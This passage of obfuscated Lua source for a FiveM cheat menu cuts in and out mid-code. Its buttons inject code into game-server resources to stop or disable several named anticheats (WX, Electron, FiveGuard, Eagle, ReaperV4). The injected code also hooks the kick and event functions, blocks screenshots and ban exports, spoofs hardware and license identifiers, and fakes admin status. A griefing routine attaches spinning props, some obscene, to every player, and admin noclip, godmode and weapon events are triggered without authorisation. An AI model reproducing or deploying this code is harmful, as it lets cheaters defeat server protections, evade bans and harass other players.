;end if (v824==(1762 -(1730 + 31))) then v154=false;break;end end end else MachoMenuNotification("[Anticheat Checker]","Electron Anticheat Not Found!");v153="";v154=false;end end);end);MachoMenuButton(v152,"Stop/Start FiveGuard Anticheat",function() CreateThread(function() local v502=1667 -(728 + 939) ;local v503;local v504;while true do if (v502==1) then if v503 then if  not v156 then MachoResourceStop(v155);MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Stopped: "   .. v155   .. "" );v156=true;else local v911=0;while true do if (v911==(0 -0)) then MachoResourceStart(v155);MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Started: "   .. v155   .. "" );v911=1;end if ((1 -0)==v911) then v156=false;break;end end end else MachoMenuNotification("[Anticheat Checker]","FiveGuard Anticheat Not Found!");v155="";v156=false;end break;end if (0==v502) then v503,v504=v158();Wait(229 -129 );v502=1069 -(138 + 930) ;end end end);end);local v159=false;local v160="";local function v161() local v398=0 + 0 ;while true do if (v398==(0 + 0)) then for v760=0 + 0 ,GetNumResources() -(4 -3)  do local v761=GetResourceByFindIndex(v760);if (string.lower(v761)=="zcn-firstblock") then v160=v761;return true;end end return false;end end end local function v162(v399) CreateThread(function() while v159 do local v564=1766 -(459 + 1307) ;while true do if (v564==(1870 -(474 + 1396))) then Wait(60000);if (MachoResourceState(v399)=="started") then local v903=0 -0 ;while true do if (v903==1) then MachoMenuNotification("[ZCN Control]","ZCN-FirstBlock restarted, stopped again.");break;end if ((0 + 0)==v903) then MachoResourceStop(v399);print("[ZCN] Resource was restarted, stopped again.");v903=1 + 0 ;end end end break;end end end end);end MachoMenuButton(v152,"Stop/Start ZCN-FirstBlock",function() CreateThread(function() local v505=v161();Wait(100);if v505 then if  not v159 then MachoResourceStop(v160);MachoMenuNotification("[ZCN Control]","ZCN-FirstBlock Stopped: "   .. v160 );v159=true;v162(v160);else MachoResourceStart(v160);MachoMenuNotification("[ZCN Control]","ZCN-FirstBlock Started: "   .. v160 );v159=false;end else local v705=0 -0 ;while true do if (v705==1) then v159=false;break;end if (v705==(0 + 0)) then MachoMenuNotification("[ZCN Control]","'ZCN-FirstBlock' Script Not Found on Server!");v160="";v705=3 -2 ;end end end end);end);MachoMenuButton(v152,"WX AntiCheat Bypass",function() local v400=0 -0 ;local v401;while true do if (0==v400) then v401=nil;if (GetResourceState("monitor")=="started") then v401="monitor";elseif (GetResourceState("qb-core")=="started") then v401="qb-core";elseif (GetResourceState("es_extended")=="started") then v401="es_extended";else v401="ox_inventory";end v400=592 -(562 + 29) ;end if (v400==(1 + 0)) then MachoInjectResource2(NewThreadNs,v401,[[
        -- ============================================================
        -- WX ANTICHEAT BYPASS V3 - COMPLETE
        -- ============================================================
        -- Full WX AntiCheat Bypass
        -- Blocks: anticheat, screenshots, resources, injections
        -- Heartbeat NOT TOUCHED
        -- ============================================================

        print('[WX Bypass] Activating...')

        -- ============================================================
        -- 1. STOP ALL WX RESOURCES
        -- ============================================================

        local antiCheatResources = {
            'wx_anticheat', 'wx-ac', 'WX-AC', 'WX_AC',
            'anticheat', 'anti-cheat', 'ac',
            'WXAntiCheat', 'WX_AntiCheat'
        }

        CreateThread(function()
            while true do
                Wait(500)
                for _, res in ipairs(antiCheatResources) do
                    if GetResourceState(res) == 'started' then
                        pcall(StopResource, res)
                        print('[WX Bypass] Stopped: ' .. res)
                    end
                end
            end
        end)

        -- ============================================================
        -- 2. OVERWRITE WX GLOBAL VARIABLES
        -- ============================================================

        if wx then
            for k, v in pairs(wx) do
                wx[k] = nil
            end
            wx = {
                Debug = true,
                HeartBeat = { enabled = true, maxTime = 30 },
                OCR = false,
                antiNoClip = false,
                antiFreeCam = false,
                antiTeleport = false,
                antiFastRun = false,
                antiVehicleNoClip = false,
                antiGodMode = false,
                antiInvisible = false,
                antiSpamVehicle = false,
                antiSpamPed = false,
                antiSpamObject = false,
                antiBlacklistedVehiclesSpawn = false,
                antiObjects = false,
                antiPeds = false,
                antiExplosion = false,
                antiParticles = false,
                antiAIs = false,
                antiMenus = false,
                antiOverlay = false,
                antiMagicBullet = false,
                antiRapidFire = false,
                antiNoRecoil = false,
                antiAimbot = false,
                antiSilentAim = false,
                antiDamageBoost = false,
                antiDefenseBoost = false,
                antiTaze = false,
                antiKill = false,
                antiFold = false,
                antiPlateChange = false,
                antiBlacklistPlate = false,
                antiResourceStop = false,
                antiResourceStart = false,
                antiModuleStop = false,
                antiNUIDevTools = false,
                antiStatebagCrash = false,
                antiInfiniteRoll = false,
                antiRadar = false,
                antiSpectate = false,
                antiExplosiveAmmo = false,
                antiInfiniteAmmo = false,
                antiThermal = false,
                antiNightVision = false,
                antiSpoofedShot = false,
                antiSmallPed = false,
                antiInfiniteStamina = false,
                antiSuperJump = false,
                antiBlips = false,
                antiObjectAttach = false,
                antiBlacklistedWeapon = false,
                antiBlacklistedVehicles = false,
                explosionLimit = false,
                fakeTriggers = false,
                messageBlacklist = false,
                antiVDM = false,
                DetectionSharing = false,
                connectPrints = false,
                connectLogs = false,
                disconnectLogs = false,
                ExplosionLogs = false,
                screenshotModule = 'disabled',
                OCRCheckInterval = 9999999,
                punishType = 'LOG',
                showReason = false,
                chatMessages = false,
                pingOnDetect = false,
                spoilerIP = false,
                needDiscord = false,
                txAdminAuth = false,
                autoSQL = false,
                banIDFormat = 1
            }
            print('[WX Bypass] WX overwritten')
        end

        if WX then WX = nil end
        if AntiCheat then AntiCheat = nil end
        if AC then AC = nil end

        -- ============================================================
        -- 3. BLOCK WX EVENTS
        -- ============================================================

        local origRegisterNetEvent = RegisterNetEvent
        local origAddEventHandler = AddEventHandler
        local origTriggerEvent = TriggerEvent
        local origTriggerServerEvent = TriggerServerEvent
        local origDropPlayer = DropPlayer

        local blockEvents = {
            'wx_anticheat:detectclient',
            'wx_anticheat:server:clientXkzuqBwmTjN7Gab4QzuN9QYZJ1WxxU',
            'wx_anticheat:checkIsAdmin',
            'wx_anticheat:isAdmin',
            'wx_anticheat:requestOCRWebhook',
            'wx_anticheat:receiveOCRWebhook',
            'wx_anticheat:requestKey',
            'wx_anticheat:receiveKey',
            'wx_anticheat:openAdminMenu',
            'wx_anticheat:playerBanned',
            'wx_anticheat:playerUnbanned',
            'wx_anticheat:checkUpdates',
            'clearPedTasksEvent',
            'removeWeaponEvent',
            'giveWeaponEvent',
            'ptFxEvent',
            'entityCreated',
            'entityCreating',
            'weaponDamageEvent',
            'explosionEvent',
            'chatMessage'
        }

        RegisterNetEvent = function(eventName)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origRegisterNetEvent(eventName)
        end

        AddEventHandler = function(eventName, handler)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origAddEventHandler(eventName, handler)
        end

        TriggerEvent = function(eventName, ...)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origTriggerEvent(eventName, ...)
        end

        TriggerServerEvent = function(eventName, ...)
            if string.find(eventName or '', 'wx_anticheat') or
               string.find(eventName or '', 'anticheat') or
               string.find(eventName or '', 'AntiCheat') then
                return
            end
            for _, blocked in ipairs(blockEvents) do
                if eventName == blocked then
                    return
                end
            end
            return origTriggerServerEvent(eventName, ...)
        end

        DropPlayer = function(playerId, reason)
            if string.find(reason or '', 'wx') or
               string.find(reason or '', 'anticheat') or
               string.find(reason or '', 'AntiCheat') or
               string.find(reason or '', 'detect') or
               string.find(reason or '', 'ban') then
                return
            end
            return origDropPlayer(playerId, reason)
        end

        -- ============================================================
        -- 4. BLOCK SCREENSHOTS
        -- ============================================================

        local screenshotResources = {
            'screenshot-basic', 'screenshot_basic', 'sc-basic',
            'screenshot', 'Screenshot'
        }

        CreateThread(function()
            while true do
                Wait(200)
                for _, res in ipairs(screenshotResources) do
                    if GetResourceState(res) == 'started' then
                        pcall(StopResource, res)
                    end
                end
            end
        end)

        local screenshotFunctions = {
            'TakeScreenshot', 'SaveScreenshot', 'RequestScreenshot',
            'SendScreenshot', 'GetScreenshot', 'Screenshot',
            'requestScreenshot', 'saveScreenshot', 'takeScreenshot',
            'captureScreenshot', 'makeScreenshot', 'createScreenshot'
        }

        for _, func in ipairs(screenshotFunctions) do
            if _G[func] then
                _G[func] = function()
                    return nil
                end
            end
        end

        -- ============================================================
        -- 5. BLOCK EXPORTS
        -- ============================================================

        if exports then
            local blockedExports = {
                'ban', 'offlineban', 'unban', 'isAdmin',
                'addAdmin', 'removeAdmin', 'whitelistPlayer',
                'removeWhitelist', 'getConfig', 'getAdminType',
                'BanPlayer', 'KickPlayer', 'DetectPlayer',
                'LogPlayer', 'PunishPlayer', 'CheckPlayer',
                'GetPlayerStatus', 'SetPlayerStatus'
            }
            
            local resources = {}
            for i = 0, 255 do
                local res = GetResourceByFindIndex(i)
                if res then
                    table.insert(resources, res)
                end
            end
            
            for _, res in ipairs(resources) do
                if exports[res] then
                    for _, exp in ipairs(blockedExports) do
                        if exports[res][exp] then
                            exports[res][exp] = function()
                                return nil
                            end
                        end
                    end
                end
            end
        end

        -- ============================================================
        -- 6. BLOCK HWID
        -- ============================================================

        local origGetPlayerToken = GetPlayerToken
        GetPlayerToken = function(playerId, index)
            if index == 1 or index == 2 or index == 3 or index == 4 or index == 5 then
                return 'FAKE_HWID_' .. tostring(math.random(100000000, 999999999))
            end
            return origGetPlayerToken(playerId, index)
        end

        local origGetPlayerIdentifiers = GetPlayerIdentifiers
        GetPlayerIdentifiers = function(playerId)
            local ids = origGetPlayerIdentifiers(playerId)
            if ids then
                local fake = {}
                for _, id in ipairs(ids) do
                    if string.find(id, 'license:') then
                        table.insert(fake, 'license:FAKE_LICENSE_' .. tostring(math.random(100000000, 999999999)))
                    elseif string.find(id, 'steam:') then
                        table.insert(fake, 'steam:FAKE_STEAM_' .. tostring(math.random(100000000, 999999999)))
                    else
                        table.insert(fake, id)
                    end
                end
                return fake
            end
            return ids
        end

        -- ============================================================
        -- 7. ADMIN STATUS
        -- ============================================================

        if wx and wx.AdminStatus then
            wx.AdminStatus = function(playerId)
                return true
            end
        end

        -- ============================================================
        -- 8. FINAL STARTUP
        -- ============================================================

        print('================================================')
        print('[WX Bypass] WX AntiCheat fully bypassed!')
        print('[WX Bypass] Screenshots blocked!')
        print('[WX Bypass] All exports blocked!')
        print('[WX Bypass] Heartbeat NOT TOUCHED!')
        print('================================================')

        CreateThread(function()
            while true do
                Wait(15000)
                print('[WX Bypass] Protection active')
            end
        end)
    ]]);MachoMenuNotification("WX Bypass","WX AntiCheat bypass activated!");v400=1421 -(374 + 1045) ;end if (v400==(2 + 0)) then print("[WX Bypass] Activated");break;end end end);MachoMenuButton(v152,"Electron AC Bypass",function() local v402=0 -0 ;local v403;while true do if (v402==(639 -(448 + 190))) then MachoInjectResource2(NewThreadNs,v403,[[
        -- Electron AC Bypass
        print("Electron AC: Bypass activated")
        
        -- Block Electron AC events
        local blockedEvents = {
            "electron:anticheat",
            "electron:detection",
            "electron:ban",
            "electron:kick",
            "electron:punish",
            "electron:report",
            "electron:flag",
            "electron:scan",
            "electron:check",
            "electron:validate",
            "electron:verify",
            "electron:heartbeat",
            "electron:ping",
            "electron:ack",
            "electron:sync",
            "electron:state",
            "electron:status",
            "electron:init",
            "electron:start",
            "electron:stop",
            "electron:restart",
            "electron:block",
            "electron:unblock",
            "electron:inject",
            "electron:detect",
            "electron:log",
            "electron:notify",
            "electron:alert",
            "electron:warn",
            "electron:error",
            "electron:info",
            "electron:debug"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() 
                CancelEvent() 
            end)
        end
        
        -- Also block wildcard patterns
        RegisterNetEvent("electron:.*", function()
            CancelEvent()
        end)
        
        -- Block all Electron related natives
        local nativesToBlock = {
            0x1DD55701034110E5,
            0xFB92A102F1C4DFA3,
            0x01FEE67DB37F59B2,
            0xF1B760881820C952,
            0x67722AEB798E5FAB,
            0xCEDABC5900A0BF97,
            0x6ADAABD3068C5235,
            0x475768A975D5AD17,
            0x3A87E44BB9A01D54,
            0x8483E98E8B888AE2,
            0x937C71165CF334B3,
            0x8DECB02F88F428BC,
            0xB0760331C7AA4155,
            0x0A6DB4965674D243,
            0xB80CA294F2F26749,
            0x34616828CD07F1A1,
            0x6C4D0409BA1A2BC2,
            0xA200EB1EE790F448,
            0x14D6F5678D8F1B37,
            0x5234F9F10919EABA,
            0x580417101DDB492F,
            0xDFB2B516207D3534,
            0x39B5D1B10383F0C8,
            0xEE778F8C7E1142E2,
            0x8D4D46230B2C353A,
            0xE659E47AF827484B,
            0x53E8CB4F48BFE623,
            0xB15162CB5826E9E8,
            0xF5F1E89A970B7796,
            0x424D4687FA1E5652,
            0xC3330A45CCCDB26A,
            0x65019750A0324133,
            0xB77D05AC8C78AADB,
            0x45F6D8EEF34ABEF1,
            0x2497C4717C8B881E,
            0x2E1202248937775C,
            0x015A522136D7F951,
            0x7FEAD38B326B9F74,
            0x7E9DFE24AC1E58EF,
            0x7DCE8BDA0F1C1200,
            0x79CFD9827CC979B6,
            0x47D6F43D77935C75,
            0xD796CB5BA8F20E32,
            0x3133B907D8B32053,
            0x3BE0BB12D25FB305,
            0xC5286FFC176F28A2,
            0xDE4C184B2B9B071A,
            0xAC29253EEF8F0180,
            0x57E457CD2C0FC168,
            0xD5037BA82E12416F,
            0x9A8D700A51CB7B0D,
            0x4805D2B1D8CF94A9,
            0xB2C086CC1BF8F2BF,
            0x77F1BEB8863288D5,
            0x03E8D3D5F549087A,
            0xA6DB27D19ECBB7DA,
            0x1BEDE233E6CD2A1F,
            0xFA7C7F0AADF25D09,
            0xF25DF915FA38C5F3,
            0xDCCFD3F106C36AB4,
            0x4899CB088EDF59B8,
            0x4E209B2C1EAD5159,
            0x2975C866E6713290,
            0x3998B1276A3300E5,
            0xE83D4F9BA2A38914,
            0x7D304C1C955E3E12,
            0x743607648ADD4587,
            0x3A6867B4845BEDA2,
            0x016C090630DF1F89,
            0xE465D4AB7CA6AE72,
            0x1CEA6BFDF248E5D9,
            0xFCDFF7B72D23A1AC,
            0x0267D00AF114F17A,
            0x394BDE2A7BBA031E,
            0x68EDDA28A5976D07,
            0x60DFD0691A170B88,
            0x11E65974A982637C
        }
        
        for _, native in ipairs(nativesToBlock) do
            Citizen.InvokeNative(0x54318C915D27E4CE, native, true)
        end
        
        -- Block NUI messages from Electron
        local _SendNUIMessage = SendNUIMessage
        SendNUIMessage = function(msg)
            if type(msg) == 'table' and msg.action then
                local blockedActions = {
                    "electron",
                    "anticheat",
                    "scan",
                    "check",
                    "report",
                    "flag",
                    "detect",
                    "ban",
                    "kick",
                    "punish",
                    "block",
                    "inject",
                    "log",
                    "alert",
                    "warn"
                }
                for _, action in ipairs(blockedActions) do
                    if string.find(string.lower(msg.action), action) then
                        return
                    end
                end
            end
            return _SendNUIMessage(msg)
        end
        
        -- Block Electron resources from starting
        local _StartResource = StartResource
        StartResource = function(resourceName)
            if string.find(string.lower(resourceName), "electron") then
                print("Electron AC: Blocked resource start: " .. resourceName)
                return
            end
            return _StartResource(resourceName)
        end
        
        -- Stop Electron resources if running
        local resources = GetNumResources()
        for i = 0, resources - 1 do
            local resource = GetResourceByFindIndex(i)
            if string.find(string.lower(resource), "electron") then
                if GetResourceState(resource) == "started" then
                    StopResource(resource)
                    print("Electron AC: Stopped resource: " .. resource)
                end
            end
        end
        
        print("Electron AC: Bypass active")
        TriggerEvent('chat:addMessage', { args = { '^2Electron AC:', 'Bypass activated successfully!' } })
    ]]);MachoMenuNotification("Electron AC","Electron AC bypass activated!");v402=2;end if (v402==(0 + 0)) then v403=nil;if (GetResourceState("monitor")=="started") then v403="monitor";elseif (GetResourceState("qb-core")=="started") then v403="qb-core";elseif (GetResourceState("es_extended")=="started") then v403="es_extended";else v403="ox_inventory";end v402=1 + 0 ;end if (v402==(2 + 0)) then print("[Electron AC] Bypass activated");break;end end end);MachoMenuButton(v152,"FiveGuard Bypass",function() local v404=0;local v405;while true do if ((3 -2)==v404) then MachoInjectResource2(NewThreadNs,v405,[[
        print("FiveGuard Bypass: Activating...")
        
        -- Stop FiveGuard resources
        local fiveGuardResources = {
            "FiveGuard", "fiveguard", "FIVEGUARD",
            "fg", "FG", "FiveGuardAC", "fiveguard_ac"
        }
        
        CreateThread(function()
            while true do
                Wait(1000)
                for _, res in ipairs(fiveGuardResources) do
                    if GetResourceState(res) == "started" then
                        pcall(StopResource, res)
                        print("FiveGuard Bypass: Stopped " .. res)
                    end
                end
            end
        end)
        
        -- Block FiveGuard events
        local blockedEvents = {
            "FiveGuard:check", "FiveGuard:detect", "FiveGuard:ban",
            "FiveGuard:kick", "FiveGuard:log", "FiveGuard:scan",
            "FiveGuard:validate", "FiveGuard:verify", "FiveGuard:punish"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() CancelEvent() end)
        end
        
        -- Hook FiveGuard natives
        local nativesToBlock = {
            0x1DD55701034110E5, 0xFB92A102F1C4DFA3, 0x01FEE67DB37F59B2,
            0xF1B760881820C952, 0x67722AEB798E5FAB, 0xCEDABC5900A0BF97,
            0x6ADAABD3068C5235, 0x475768A975D5AD17, 0x3A87E44BB9A01D54,
            0x8483E98E8B888AE2, 0x937C71165CF334B3, 0x8DECB02F88F428BC,
            0xB0760331C7AA4155, 0x0A6DB4965674D243, 0xB80CA294F2F26749,
            0x34616828CD07F1A1, 0x6C4D0409BA1A2BC2, 0xA200EB1EE790F448
        }
        
        for _, native in ipairs(nativesToBlock) do
            Citizen.InvokeNative(0x54318C915D27E4CE, native, true)
        end
        
        print("FiveGuard Bypass: Active")
        TriggerEvent('chat:addMessage', { args = { '^2FiveGuard Bypass:', 'Activated successfully!' } })
    ]]);MachoMenuNotification("FiveGuard","FiveGuard bypass activated!");break;end if ((0 -0)==v404) then v405=nil;if (GetResourceState("monitor")=="started") then v405="monitor";elseif (GetResourceState("qb-core")=="started") then v405="qb-core";else v405="ox_inventory";end v404=1495 -(1307 + 187) ;end end end);MachoMenuButton(v152,"Eagle AC Bypass",function() local v406=nil;if (GetResourceState("monitor")=="started") then v406="monitor";elseif (GetResourceState("qb-core")=="started") then v406="qb-core";else v406="ox_inventory";end MachoInjectResource2(NewThreadNs,v406,[[
        print("Eagle AC Bypass: Activating...")
        
        -- Stop Eagle AC resources
        local eagleResources = {
            "Eagle", "eagle", "EagleAC", "eagle_ac",
            "EC-AC", "EC_AC", "EC-PANEL", "EC_PANEL"
        }
        
        CreateThread(function()
            while true do
                Wait(1000)
                for _, res in ipairs(eagleResources) do
                    if GetResourceState(res) == "started" then
                        pcall(StopResource, res)
                        print("Eagle AC Bypass: Stopped " .. res)
                    end
                end
            end
        end)
        
        -- Block Eagle AC events
        local blockedEvents = {
            "Eagle:ban", "Eagle:kick", "Eagle:detect", "Eagle:check",
            "EC-AC:ban", "EC-AC:kick", "EC-AC:detect",
            "EC_AC:ban", "EC_AC:kick", "EC_AC:detect",
            "eagle:ban", "eagle:kick", "eagle:detect",
            "ec-ac:ban", "ec-ac:kick", "ec-ac:detect"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() CancelEvent() end)
        end
        
        -- Block Eagle AC NUI
        local _SendNUIMessage = SendNUIMessage
        SendNUIMessage = function(msg)
            if type(msg) == 'table' and msg.action then
                local blockedActions = {"eagle", "ec", "ban", "kick", "detect", "anticheat"}
                for _, action in ipairs(blockedActions) do
                    if string.find(string.lower(msg.action), action) then
                        return
                    end
                end
            end
            return _SendNUIMessage(msg)
        end
        
        print("Eagle AC Bypass: Active")
        TriggerEvent('chat:addMessage', { args = { '^2Eagle AC Bypass:', 'Activated successfully!' } })
    ]]);MachoMenuNotification("Eagle AC","Eagle AC bypass activated!");end);MachoMenuButton(v152,"ReaperV4 Bypass",function() local v407=nil;if (GetResourceState("monitor")=="started") then v407="monitor";elseif (GetResourceState("qb-core")=="started") then v407="qb-core";else v407="ox_inventory";end MachoInjectResource2(NewThreadNs,v407,[[
        print("ReaperV4 Bypass: Activating...")
        
        -- Stop Reaper resources
        local reaperResources = {
            "ReaperV4", "Reaper", "reaper", "REAPER"
        }
        
        CreateThread(function()
            while true do
                Wait(1000)
                for _, res in ipairs(reaperResources) do
                    if GetResourceState(res) == "started" then
                        pcall(StopResource, res)
                        print("ReaperV4 Bypass: Stopped " .. res)
                    end
                end
            end
        end)
        
        -- Hook Reaper natives
        local nativesToBlock = {
            0xC6D3D26810C8E0F9, 0x8D4D46230B2C353A, 0xB15162CB5826E9E8,
            0xD5037BA82E12416F, 0xFB92A102F1C4DFA3, 0x19CAFA3C87F7C2FF,
            0xA200EB1EE790F448, 0x5234F9F10919EABA, 0x997ABD671D25CA0B
        }
        
        for _, native in ipairs(nativesToBlock) do
            Citizen.InvokeNative(0x54318C915D27E4CE, native, true)
        end
        
        -- Block Reaper events
        local blockedEvents = {
            "Reaper:NewDetection", "Reaper:detection", "Reaper:ban",
            "Reaper:kick", "Reaper:punish", "Reaper:log"
        }
        
        for _, event in ipairs(blockedEvents) do
            RegisterNetEvent(event, function() CancelEvent() end)
        end
        
        print("ReaperV4 Bypass: Active")
        TriggerEvent('chat:addMessage', { args = { '^2ReaperV4 Bypass:', 'Activated successfully!' } })
    ]]);MachoMenuNotification("ReaperV4","ReaperV4 bypass activated!");end);MachoMenuButton(v152,"Stop All Anticheat Resources",function() local v408=nil;if (GetResourceState("monitor")=="started") then v408="monitor";elseif (GetResourceState("qb-core")=="started") then v408="qb-core";else v408="ox_inventory";end MachoInjectResource2(NewThreadNs,v408,[[
        print("Stopping all anticheat resources...")
        
        local antiCheatResources = {
            -- FiveGuard
            "FiveGuard", "fiveguard", "FIVEGUARD", "fg", "FG", "FiveGuardAC",
            -- Eagle AC
            "Eagle", "eagle", "EagleAC", "eagle_ac", "EC-AC", "EC_AC", "EC-PANEL", "EC_PANEL",
            -- Reaper
            "ReaperV4", "Reaper", "reaper", "REAPER",
            -- WX
            "wx_anticheat", "wx-ac", "WX-AC", "WX_AC", "WXAntiCheat", "WX_AntiCheat",
            -- Electron
            "ElectronAC", "electron", "ELECTRON",
            -- Fini
            "FiniAC", "fini", "FINI",
            -- WaveShield
            "WaveShield", "waveshield", "WAVESHIELD",
            -- Generic
            "anticheat", "anti-cheat", "ac", "AntiCheat", "ANTICHEAT"
        }
        
        local stopped = 0
        
        for _, res in ipairs(antiCheatResources) do
            if GetResourceState(res) == "started" then
                pcall(StopResource, res)
                pcall(ExecuteCommand, 'stop ' .. res)
                print("Stopped: " .. res)
                stopped = stopped + 1
            end
        end
        
        print("Stopped " .. stopped .. " anticheat resources")
        TriggerEvent('chat:addMessage', { args = { '^2Anticheat Killer:', 'Stopped ' .. stopped .. ' anticheat resources!' } })
    ]]);MachoMenuNotification("Anticheat Killer","Stopping all anticheat resources...");end);local v163=false;local v164=nil;local v165={};local function v166() v163=false;v164=nil;for v506,v507 in ipairs(v165) do if DoesEntityExist(v507) then DeleteEntity(v507);end end v165={};MachoMenuNotification("Eagle Props","Stopped all prop spawns!");print("[Eagle Props] Stopped and cleaned up all objects");end local function v167() v163=true;MachoInjectResource2(NewThreadNs,"monitor",[[
        eaglePropsActive = true
        local attachedProps = {}
        local players = GetActivePlayers()
        
        if #players == 0 then
            print("[Eagle Props] No players found")
            return
        end
        
        print("[Eagle Props] Starting object attachment on " .. #players .. " players")
        
        for _, pid in ipairs(players) do
            if not eaglePropsActive then break end
            
            local ped = GetPlayerPed(pid)
            local name = GetPlayerName(pid)
            
            if DoesEntityExist(ped) and not IsEntityDead(ped) then
                print("[Eagle Props] Processing: " .. name .. " (ID: " .. pid .. ")")
                
                -- List of objects to attach
                local attachModels = {
                    "prop_windmill_01",
                    "prop_roadcone01a",
                    "prop_barrel_01a",
                    "prop_tyre_01a",
                    "prop_ball_01a",
                    "v_res_tre_stool",
                    "prop_cs_dildo",
                    "prop_cash_crate_01",
                    "prop_med_jet_01",
                    "prop_rub_carpart_01",
                    "prop_skip_01a",
                    "prop_air_bag_01a"
                }
                
                for _, modelName in ipairs(attachModels) do
                    if not eaglePropsActive then break end
                    
                    local model = GetHashKey(modelName)
                    RequestModel(model)
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < 50 do
                        Citizen.Wait(10)
                        attempts = attempts + 1
                    end
                    
                    if HasModelLoaded(model) then
                        local offsetX = math.random(-10, 10) / 10
                        local offsetY = math.random(-10, 10) / 10
                        local offsetZ = math.random(0, 20) / 10
                        
                        local coords = GetEntityCoords(ped)
                        local obj = CreateObject(model, coords.x, coords.y, coords.z, true, true, true)
                        
                        if DoesEntityExist(obj) then
                            AttachEntityToEntity(obj, ped, 0, offsetX, offsetY, offsetZ, 0.0, 0.0, 0.0, false, false, true, false, 2, true)
                            table.insert(attachedProps, obj)
                            
                            -- Store globally for cleanup
                            _G.eagleAttachedProps = attachedProps
                            
                            print("[Eagle Props] Attached " .. modelName .. " to " .. name)
                            
                            -- Spin each object
                            CreateThread(function()
                                while eaglePropsActive and DoesEntityExist(obj) do
                                    local rot = GetEntityRotation(obj)
                                    SetEntityRotation(obj, rot.x, rot.y, rot.z + 5.0, 0, true)
                                    Citizen.Wait(10)
                                end
                            end)
                        end
                    else
                        print("[Eagle Props] Failed to load model: " .. modelName)
                    end
                    Citizen.Wait(200)
                end
            else
                print("[Eagle Props] Player " .. name .. " is invalid or dead")
            end
            Citizen.Wait(500)
        end
        
        print("[Eagle Props] All objects attached. They will auto-cleanup when stopped.")
    ]]);MachoMenuNotification("Eagle Props","Prop spawn started on all players!");print("[Eagle Props] Started");end MachoMenuButton(v152,"Toggle Eagle Props",function() if v163 then v166();else v167();end end);MachoMenuButton(v152,"Stop Eagle Props",function() v166();end);MachoMenuButton(v152,"Eagle Props Status",function() if v163 then local v565=0 -0 ;local v566;while true do if (v565==(0 -0)) then v566= #v165;MachoMenuNotification("Eagle Props","Active! "   .. v566   .. " objects attached" );v565=2 -1 ;end if (v565==1) then print("[Eagle Props] Active - "   .. v566   .. " objects attached" );break;end end else MachoMenuNotification("Eagle Props","Inactive");print("[Eagle Props] Inactive");end end);print("[Eagle Props] Toggle added to AntiCheatSection!");MachoMenuButton(v10,"Toggle Admin Names",function() local v409=683 -(232 + 451) ;while true do if ((0 + 0)==v409) then TriggerEvent("qb-admin:client:toggleNames");MachoMenuNotification("Admin","Toggling admin names...");break;end end end);MachoMenuButton(v10,"Toggle Admin Blips",function() local v410=0 + 0 ;while true do if ((564 -(510 + 54))==v410) then TriggerEvent("qb-admin:client:toggleBlips");MachoMenuNotification("Admin","Toggling admin blips...");break;end end end);MachoMenuCheckbox(v10,"Tx Noclip - Safe",function() local v411=0;while true do if (v411==(1 -0)) then TriggerEvent("txcl:setPlayerMode","noclip");MachoMenuNotification("TX System","Noclip active! Electricity effect added!");break;end if (v411==(36 -(13 + 23))) then v16=true;MachoInjectResource("monitor",[[
        local playerPed = PlayerPedId()
        
        -- Sound effect
        PlaySoundFromEntity(-1, "ent_amb_elec_crackle", playerPed, 0, false, 0)
        
        -- Electricity effect (original txsrc particle)
        CreateThread(function()
            -- Load core asset
            RequestNamedPtfxAsset("core")
            while not HasNamedPtfxAssetLoaded("core") do
                Wait(1)
            end
            
            UseParticleFxAsset("core")
            
            -- Original txsrc electricity effect
            local particle = StartParticleFxLoopedOnEntity(
                "ent_dst_elec_fire_sp",
                playerPed,
                0.0, 0.0, 0.0,
                0.0, 0.0, 0.0,
                1.75,
                false, false, false
            )
            
            -- Wait 1.5 seconds (same as txsrc)
            Wait(1500)
            
            -- Stop
            if particle then 
                StopParticleFxLooped(particle, true) 
            end
            
            RemoveNamedPtfxAsset("core")
        end)
    ]]);v411=1 -0 ;end end end,function() local v412=0 -0 ;while true do if ((1 -0)==v412) then MachoMenuNotification("TX System","Noclip deactivated!");break;end if (v412==0) then v16=false;TriggerEvent("txcl:setPlayerMode","none");v412=1;end end end);MachoMenuCheckbox(v10,"Tx Godmode - Safe",function() local v413=1088 -(830 + 258) ;while true do if (v413==(3 -2)) then MachoMenuNotification("TX Features","Godmode active!");break;end if (v413==0) then v17=true;TriggerEvent("txcl:setPlayerMode","godmode");v413=1 + 0 ;end end end,function() local v414=0 + 0 ;while true do if (v414==0) then v17=false;TriggerEvent("txcl:setPlayerMode","none");v414=1;end if (v414==(1442 -(860 + 581))) then MachoMenuNotification("TX Features","Godmode deactivated!");break;end end end);MachoMenuCheckbox(v10,"Tx SuperJump - Safe",function() v18=true;TriggerEvent("txcl:setPlayerMode","superjump");MachoMenuNotification("TX Features","SuperJump active!");end,function() v18=false;TriggerEvent("txcl:setPlayerMode","none");MachoMenuNotification("TX Features","SuperJump deactivated!");end);MachoMenuButton(v10,"TX TP Waypoint - Safe",function() TriggerEvent("txcl:tpToWaypoint");end);MachoMenuButton(v9,"Revive - Safe",function() TriggerEvent("hospital:client:Revive",PlayerPedId());end);MachoMenuButton(v10,"Tx Car Fix - Safe",function() TriggerEvent("txcl:vehicle:fix");end);MachoMenuButton(v10,"Tx Wild Attack - Risky",function() TriggerEvent("txcl:wildAttack");end);MachoMenuButton(v10,"Tx Car Boost - Risky",function() TriggerEvent("txcl:vehicle:boost");end);MachoMenuText(v9,"Weapon Spawn");MachoMenuButton(v9,"RPG Spawn - Risky",function() 